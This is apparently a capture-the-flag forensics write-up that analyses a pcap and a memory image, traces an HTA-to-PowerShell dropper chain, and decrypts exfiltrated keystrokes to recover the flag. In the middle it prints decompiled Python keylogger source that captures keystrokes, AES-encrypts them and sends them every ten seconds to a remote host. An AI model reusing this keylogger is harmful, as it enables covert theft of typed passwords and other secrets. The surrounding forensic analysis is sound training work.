# Time is of the essence (Forensics)

## Flag

``
HTB{t3ll_me_@ll_Your_S3cr3ts}
``

## Solution

The challenge contains two files; a network traffic packet capture file (tioe.pcap) and a memory file (tioe.raw) which from the challenge description, we are provided with the image profile of the operating system, saving from us a lot of time.

Starting the investigation from tioe.pcap file contains some interesting clues; which are some GET requests that we are focus on them and at the last packets transmission, we observe a time particularity. Let's dive on.

These are the interesting GET requests.

![4](https://user-images.githubusercontent.com/73289579/110716904-be604580-8210-11eb-9605-fb11b63198a8.png)
![13](https://user-images.githubusercontent.com/73289579/110716989-ebacf380-8210-11eb-8e36-513376560a05.png)
![17](https://user-images.githubusercontent.com/73289579/110717018-fa93a600-8210-11eb-9b70-55156f25477d.png)

Exporting the following objects from the network traffic and starting a further analysis.

![file_open](https://user-images.githubusercontent.com/73289579/110717111-1dbe5580-8211-11eb-968c-2b0ed93f7e50.png)
![export_open](https://user-images.githubusercontent.com/73289579/110717151-2f076200-8211-11eb-9ad7-0c983b94e8b7.png)

The "job_aplication.hta" file contains a powershell command which executes a base64 string. Decoding the base64 string, we get an information that we are requesting another file, named "dow.ps1".

![jobapplicationhta](https://user-images.githubusercontent.com/73289579/110717253-5e1dd380-8211-11eb-807f-1fb336f0ecfb.png)
![base64decodedstring](https://user-images.githubusercontent.com/73289579/110717293-72fa6700-8211-11eb-85f9-383a40666bfc.png)

The "dow.ps1" file, request an executable file, named "cbtws.exe".

![cbtwsexe](https://user-images.githubusercontent.com/73289579/110717342-8a395480-8211-11eb-8417-87c100594455.png)

The "cbtws.exe" file is a PE32+ Executable.

![file](https://user-images.githubusercontent.com/73289579/110717561-fa47da80-8211-11eb-9a8f-c89250e5bfe8.png)

Executing the command strings on this file, we can see a lot of python modules. So we start searching how to extract those python files. After a lot of search, we found a github repo (https://github.com/extremecoders-re/pyinstxtractor) which helped us to extract the contents.

![pyinstxtractor](https://user-images.githubusercontent.com/73289579/110717620-151a4f00-8212-11eb-9e93-23f94e8b32b2.png)

When we extract the previous files, a specific message showed us that the "pyiboot01_bootstrap.pyc" and "keylog.pyc" are some possibles entries points. After a research we found that the "pyiboot01_bootstrap.pyc" file wasn't what we need. So, we are focus on the other file.

To convert this file, from .pyc to .py we use the folowing python library.
https://github.com/andrew-tavera/unpyc37

Then we get this code.

```
from pynput.keyboard import Listener
from datetime import datetime
from Crypto.Cipher import AES
import threading
import socket
import random
text = ''

def gen_key() -> str:
    key = ''
    sed = int(datetime.now().strftime('%H%M%S'))
    random.seed(sed)
    for i in range(16):
        char = random.randint(32, 127)
        key += chr(char)
    return key

def aes_enc(text:bytes) -> bytes:
    key = 'oW7P0lH8aroxDKqn'
    iv = gen_key()
    cipher = AES.new(key.encode('utf-8'), AES.MODE_CFB, iv.encode('utf-8'))
    return cipher.encrypt(text)

def send(text:str) -> None:
    HOST = '192.168.1.9'
    PORT = 4443
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(aes_enc(text.encode('utf-8')))

def report() -> None:
    global text
    if text != '':
        send(text)
    text = ''
    timer = threading.Timer(10, report)
    timer.start()

def keystrokes(key:str) -> None:
    global text
    key = str(key).replace("'", '')
    text += key + ' '

def main() -> None:
    with Listener(on_press=keystrokes) as log:
        report()
        log.join()

if __name__ == '__main__':
    main()
```


After reading the code, we understand that continuously reads the keystrokes and every 10 seconds it sends them encrypted by AES CFB mod of operation. We have the key and the only think that is changing is the initialize vector which is created by random.randint(), its seed created by a specific time.

We find the time from the .raw file. Specifically, we use volatility and search for processes focus on the "cbtws.exe" file and we find the time which executed.

***vol.py -f /tioe.raw --profile=Win10x64_17134 pstree***

![volatility_exe_time](https://user-images.githubusercontent.com/73289579/110718257-48a9a900-8213-11eb-9ec8-763b4a310c69.png)

At the beginning of this writeup, we mentioned some interestings clues about the "tioe.pcap" file. First, was the GET requests and secondly was the time particularity on the last packets. We observe that those packets are sent every 10 seconds.


![packetsevr10s](https://user-images.githubusercontent.com/73289579/110718377-87d7fa00-8213-11eb-90ff-2231c2a01352.png)

So, we need to extract those packets. Right Click (on the packet we want) > Follow > TCP Stream and on the opened window, we select a raw preview of the data.


![firststream](https://user-images.githubusercontent.com/73289579/110718423-9faf7e00-8213-11eb-9d68-5a4791bd4764.png)

We collect all of this data until the last stream (the last one is the 18th).


![finalstream](https://user-images.githubusercontent.com/73289579/110718459-b3f37b00-8213-11eb-9eb4-04ec598b66e6.png)

Now, we have to create a script for decrypting those data.

```

from Crypto.Cipher import AES
from datetime import *
import random


c1 = "cbb63ce8f39237af0a6e91dd305a6ae92e796394a82803eac03a3b309a3f72be0a2560d35fa10a8d5d2c9ce739f16c081922fcf78d892c03fd2a6e8e2f22e05ad0317a903263675ca1f3f4a55505bd9bb4fd0fc0dbb709863f93ef4b32c0b64d3fe74e3c946a965914b7493c7dab1d8d6cc8e9affaceed3325ee22d6aa48fd4a383564019da8e36848e1f8f9f6b262439fa84d35be7b39d2d1e7f3ed33e5"
c2 = "dfa3002df354f2f39e4bbd443896287985deda9e130a20380abb4dda65783e2808abc0f7b0f4379eb0d39e1b5e6e2de1624fe5b5434ff149a22424e04ae6a0a618ad0845c80a107548c959c94e6093a301c8ff380407782b966e318108bddc3b5c757cbebee8a63b8c9d34b7a444e97e3c245f799f9ef2106fefbca97df17495a856e1789ba1ffe01073d4a97b45ba81e0e1"
c3 = "f8a186d5d44f89ab7e756c02a43121a9cded62fd482b3ff305ed01526e2116461e81fcb0608278d55dc7387d1ff4ded2c15a6ce760cc9f6a"
c4 = "89f0bc72deff7d0e17906263906be079c0c1c192586c6d03e886b7ab8389ff663972264514f8deff9e42df2f5ba6ffe55e3e1f0696eacf518a1c09c5e57d2d91641cd9ebdee20286e7ee5690651a07da17bf88c111460c7dd8ff381f89a7e1fbf31c6ab8c765a80e6fe4c306fbe3cc70a1ad2586d8052c033832339eb63d8b5ab52ac21d11616bb72a6294a32997937ba78cd19298f9e44e4a5bbca7b9e35c3ecdd8f2f9380f5fc1541103ee98aacd4bfca591df2b093e7f588e"
c5 = "0458a3ef7650173672990be261e3b87fc3a34f5bba43ba2c0871e1e74b917233cddb14c93f193b25be9a366af736821495b9caa20ade6726ecc2b326b9834424a2d38d3e984a5387a09bcca0d137b7b09f4bdc0ab97bb32d0fcd5a6d0b7a3b361888843ea972fb627c894da3bdb3ef0a5499e5001f53a9de7f33075ac45183edce8fa1d0a6d127d9172dd4077fc4a97796dc1bad9aaf7459a3fc4bf7e0d6bcbfad5bcdf16afbb95e3b907cb024a3fc3f9760e0d00a2e7684368a6fd7b124482badcba6acef39795e4bbd12879e2033e7deab4f4e1a3f2295880f88a8940858acebcfd0c89a7111ecf9f6f6107d8a"
c6 = "da004563ef765d50a03e74b917215e4c2c6f8541c8f5e7f6ce5cfba8bc9187c12d82e4b5ca4733e7682c5d292330939a36b80c282aa8bf4a0785610160ce8c74cfcbc342450f69e29c34f4656f7a735cfcd9e5c4"
c7 = "418bee98a4eb864808207b2f6f0fd214f21b1c2c3b8c3b557283956f121e3a86f476d0aaffdb4248ff126baa69a10b17b2c584f1b4a9f679a9ca16f7a2d1"
c8 = "ec24a9573a0802aa59088023265e680e"
c9 = "41ba0541bb62c61be797423ad7bdb296"
c10 = "5aac6ccd5d17d78c7d975fd28041b521"
c11 = "e4f5f582541de0926448f2c5babdf982"
c12 = "7913a359581a25feda2be8e2df1715bb31bc77ac63cfca7c7ad46a30b1a91aba249caaa69995462a0618f4efba876a54903f44172a2611f5a2783436207be454a03ffe1da7b15516b330f32da973be09"
c13 = "ceb23aa330800bb5be8abf080e6a86fb4c85bf1c72f5f30da837a54d429dc00c"
c14 = "0ab0d10d7d7811dfbb06ef27889b5ae8faecf9e56ebd316ffb3a7cf6780ad68643cff8f9"
c15 = "819ecc9fd6eaaa6f957e3f351acc86017d6684999ae36597f8fa"
c16 = "a527d4d23b4569afa05b7f68322084946ce9d0caa8f38f41a449da0b1ec08ed41d1cf7d1028633d66158e41717a83d737caa8d976354ca515d805fbed7285108d0ffbd1a6b30360f1805dcaac5e6ab07494f821e47871be7ef8d6604f7af6e2bd1aaf46aae979ae83ba3049854b53957cc96aca0cd478007b2967dbefc35ed989909838a4180a2c7e041"
c17 = "a870f8524cf132984bbacdbcd0a44d768e5f9a3467effbca4dcb6cab3341957d00131021203cd24a5096f0350522053bac2822146c29eba6"

cts = [c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11,c12,c13,c14,c15,c16,c17]

def gen_key(lol):
    key = ''
    sed = lol
    random.seed(sed)
    for i in range(16):
        char = random.randint(32, 127)
        key += chr(char)
    return key


var1 = datetime.strptime('20:00:22', '%H:%M:%S')
for ct in cts:
    var2  = int(var1.strftime('%H%M%S'))
    key = 'oW7P0lH8aroxDKqn'
    iv = gen_key(var2)
    cipher = AES.new(key.encode('utf-8'), AES.MODE_CFB, iv.encode('utf-8'))
    keystrokes = cipher.decrypt(bytes.fromhex(ct))
    print(keystrokes)
    var1 = var1 + timedelta(0,10)

```

Running the scripting we obtain the following results.

![output_without_flag](https://user-images.githubusercontent.com/73289579/110718703-31b78680-8214-11eb-899d-fe54ef8e1829.png)

Manually we can obtain the flag.

![output_without_flag_AGAIN_xaxa](https://user-images.githubusercontent.com/73289579/110719140-f7021e00-8214-11eb-92eb-a8efa213bce4.png)

***HTB{t3ll_me_@ll_Your_S3cr3ts}***
